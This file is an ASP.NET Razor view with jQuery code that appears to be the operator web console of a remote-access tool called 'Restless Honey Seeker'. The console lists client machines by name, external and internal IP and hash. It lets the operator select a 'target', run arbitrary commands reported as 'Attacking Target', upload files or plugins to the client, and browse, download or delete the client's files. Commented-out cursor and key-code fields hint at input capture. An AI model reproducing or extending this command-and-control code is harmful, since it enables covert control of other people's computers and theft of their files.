@{
    ViewBag.Title = "Restlesss Honey Seeker";
}
@Styles.Render("~/Content/jquery.console.blink.css")
@Styles.Render("~/Content/jquery.console.custom.css")
@*<div class="row">
    <div class="col-md-12">
        <div id="containerDiv">...</div>
    </div>
</div>*@
<div class="row">
        <div class="col-md-12">
            <div class="form-group">
                @*<label for="computer">Upload</label>*@
                <form role="form" class="form-inline">
                    @*<select id="uploadType" class="form-control">
                        <option value="@Library.ECommand.UploadFile">File</option>
                        <option value="@Library.ECommand.UploadPlugin">Plugin</option>
                    </select>*@
                    <input id="files" type="file" />
                </form>
            </div>
        </div>
    </div>
<div class="row">
    <div class="col-md-12">
        <div class="console"></div>
    </div>
</div>
<script type="text/javascript" src="~/Content/jquery.console.js"></script>
<script type="text/javascript">
    var controller = null;

    $(function () {

        $('input[type="file"]').change(function () {
            //alert("uploading");
            commands['upload']("file", function (result) {
                //alert("OK");
            });
        });

        var console = $('.console');
        controller = console.console({
            promptLabel: '> ',
            commandValidate: function (line) {
                if (line == "") return false;
                else return true;
            },
            commandHandle: function (line, report) {
                var isDone = false;
                executeCommand(line, function (result) {
                    isDone = true;
                    report(result);
                });
                if (!isDone) {
                    report("");
                    return false;
                }
            },
            animateScroll: true,
            promptHistory: true,
            welcomeMessage: "Restless Honey Seeker [Version 2016.2.4]\r\nType 'help' for a list of commands"
        });
        //controller.promptText('5 * 4');
    });

    function executeCommand(input, onSuccess) {
        var inputSplit = input.split(' ');
        var command = inputSplit.length > 0 ? inputSplit[0] : null;
        var parameters = inputSplit.length > 1 ? inputSplit.slice(1, inputSplit.length) : null;
        if (command) {
            if (typeof commands[command] === 'function') {
                commands[command](parameters, onSuccess);
            }
            else {
                commands['run'](command, parameters, onSuccess);
            }
        }
    }

    var computers = [],
        files = [],
        currentTarget = null;
    var serverCommands = [
        { 'name': 'help', 'desc': '' },
        { 'name': 'cmd', 'desc': 'List of client commands' },
        { 'name': 'list', 'desc': 'List of client computers' },
        { 'name': 'clear', 'desc': 'Clear console input' },
        { 'name': 'target', 'desc': '' }
    ];

    var returnResult = [];

    function getResult() {
        var result = returnResult.slice(0);
        returnResult = [];
        return result;
    }

    function addLine(text, hasMargin) {
        text += hasMargin ? "\t" : "";
        returnResult.push({ msg: text, className: "jquery-console-message-value" });
    }

    var commands = {
        upload: function (parameters, onSuccess) {
            var files = $("#files").get(0).files;
            if (currentTarget) {
                if (files && files.length > 0) {
                    var fileName = files[0]['name'];
                    addLine("Uploading file '" + fileName + "'...");
                    var data = new FormData();
                    data.append("UploadedFile", files[0]);
                    $.ajax({
                        type: 'POST',
                        url: '/Home/UploadFile',
                        contentType: false,
                        processData: false,
                        data: data,
                        success: function (data) {
                            addLine("Done uploading file!");
                            controller.report(getResult());
                            editSettings('@Library.ECommand.UploadFile', fileName, "");
                        }
                    });
                }
            }
            else {
                noTarget();
                controller.report(getResult());
            }
        },
        help: function (parameters, onSuccess) {
            addLine("Available server commands:");
            $.each(serverCommands, function (k, v) {
                addLine(getCommandDescription(v), true);
            });
            onSuccess(getResult());
        },
        cmd: function (parameters, onSuccess) {
            addLine("Available client commands:");
            $.get('/Home/GetAvailableCommands').done(function (text) {
                var commands = JSON.stringify(text);
                $.each(JSON.parse(commands), function (k, v) {
                    addLine(v, true);
                });
                onSuccess(getResult());
            });
        },
        clear: function (parameters, onSuccess) {
            controller.reset();
            addLine("Type 'help' for a list of commands.", "white");
            onSuccess(getResult());
        },
        cls: function (parameters, onSuccess) {
            commands["clear"]();
        },
        get: function (parameters, onSuccess) {
            var file = getSelectedFile(parameters);
            if (currentTarget && file) {
                window.open('/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=' + file);
            }
        },
        rm: function (parameters, onSuccess) {
            var file = getSelectedFile(parameters);
            if(currentTarget && file) {
                $.post('/Home/DeleteFile', { 'computerHash' : currentTarget['Hash'], 'filename' : file }, function (result) {
                    console.log("result: " + result);
                }, "json");
            }
        },
        ls: function (parameters, onSuccess) {
            if (currentTarget) {
                $.ajax({
                    url: '/Home/GetFilesInDir?computerHash=' + currentTarget['Hash'],
                    dataType: 'text',
                    success: function (data) {
                        var json = JSON.parse(data);
                        files = [];
                        $.each(json, function (k, v) {
                            files.push({ id: "" + k, val: v });
                            addLine(k + ": " + v);
                        });
                        //console.log(json);
                        onSuccess(getResult());
                    }
                });
            }
            else {
                noTarget();
                onSuccess(getResult());
            }
        },
        run: function (command, parameters, onSuccess) {
            if (currentTarget) {

                addLine("Attacking Target: '" + getComputerDescription(currentTarget) + "'.");
                addLine("Command: " + command);
                var pars = "";
                if (parameters && parameters.length >= 1) {
                    var parsArray = parameters;
                    for (var i = 0; i < parsArray.length; i++) {
                        pars += parsArray[i] + " ";
                    }
                    pars = pars.trim();
                }
                addLine("Parameters: " + pars);
                editSettings(command, pars, "");
                getStatus(onSuccess);
            } else {
                noTarget();
            }
            onSuccess(getResult());
        },
        attack: function (parameters, onSuccess) {
            var command = parameters.length >= 1 ? parameters[0] : null;
            commands.run(command, parameters.slice(1, parameters.length), onSuccess);
        },
        target: function (parameters, onSuccess) {
            if (parameters) {
                if (parameters.length == 1) {
                    var param1 = ('' + parameters[0]).toLowerCase();
                    if (param1 == 'remove' || param1 == 'clear') {
                        addLine("Target '" + getComputerDescription(currentTarget) + "' removed.");
                        currentTarget = null;
                    }
                    else {
                        var obj = _.findWhere(computers, { 'id': param1 });
                        if (obj && obj['val']) {
                            currentTarget = obj['val'];
                            addLine("New Target: " + getComputerDescription(currentTarget));
                        }
                    }
                }
            }
            else {
                if (currentTarget) {
                    addLine("Current Target: " + getComputerDescription(currentTarget));
                }
                else {
                    noTarget();
                    addLine("");
                    addLine("Available computers:");
                    $.getJSON('/Home/GetComputers').done(function (data) {
                        computers = [];
                        var dataParsed = JSON.parse(data);
                        $.each(dataParsed, function (k, v) {
                            computers.push({ id: "" + k, val: v });
                            addLine(k + ": " + getComputerDescription(v), true);
                        });
                        onSuccess(getResult());
                    });
                }
            }
            onSuccess(getResult());
        }
    }

    function getSelectedFile(parameters) {
        var file = files && parameters && parameters.length === 1 ? files[parameters] : null;
        return file ? file['val'] : null;
    }

    function noTarget() {
        addLine("No target selected...\r\n");//Use 'list' to see a list of computers.");
    }

    var psChecker;

    function getStatus(onSuccess) {
        addLine("waiting for response (data) from client...");
        onSuccess(getResult());
        psChecker = setInterval(function () {
            $.ajax({
                url: '/api/rhs/getsettings', // returns settings.json
                dataType: 'text',
                success: function (data) {
                    var json = JSON.parse(data);
                    if (currentTarget != null) {
                        if (json['ComputerHash'] == null) {
                            clearInterval(psChecker);
                            //$("#containerDiv").text("done! File: " + json['OutputFile']);
                            if (json['OutputFile']) {
                                if (json['CanDisplayFileContents']) {
                                    $.ajax({
                                        url: '/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=' + json['OutputFile'],
                                        dataType: 'text',
                                        success: function (result) {
                                            //currentTarget = null;
                                            addLine(result);
                                            onSuccess(getResult());
                                        }
                                    });
                                } else {
                                    addLine("Finished executing");
                                    onSuccess(getResult());
                                }
                            }
                            else {
                                addLine("Finished executing");
                                onSuccess(getResult());
                            }
                        }
                        else {
                            //$("#containerDiv").text("working...");
                        }
                    }
                }
            });
        }, 500);
    }

    function getCommandDescription(command) {
        return command['name'] + (command['desc'] ? " (" + command['desc'] + ")" : "");
    }

    function getComputerDescription(computer) {
        if (computer) {
            console.log(computer);
            return computer['Name'] + ", IP ext.: " + computer['IpExternal'] + ", IP int.: " + computer['IpInternal'] + ", Hash: " + computer['Hash'];
        }
        return "No computer selected";
    }

    function editSettings(command, parameters, file) {
        if (currentTarget) {
            var data = {
                'ComputerHash': currentTarget['Hash'],
                'Command': command,
                'File': file,
                'Parameters': parameters,
                //'cursorX': cursorX,
                //'cursorY': cursorY,
                //'keyCode': keyCode
            };
            $.post('/api/RHS/SaveSettings', data, function (result) {
                //console.log("result: " + result);
            }, "json");
            //.fail(function (data) {
            //    console.log('failed');
            //});
        }
    }
</script>
<noscript>
    <p>
        <strong>Please enable JavaScript or upgrade your browser.</strong>
    </p>
</noscript>
